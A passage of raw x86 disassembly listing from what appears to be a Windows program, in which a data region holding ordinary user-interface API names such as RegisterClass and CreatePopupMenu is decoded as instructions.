  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc8],cl
  412441:	sub    al,0x3
	...
  41244b:	add    dl,ch
  41244d:	test   eax,0x4d49
  412452:	add    BYTE PTR [eax],al
  412454:	jp     0x41247a
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
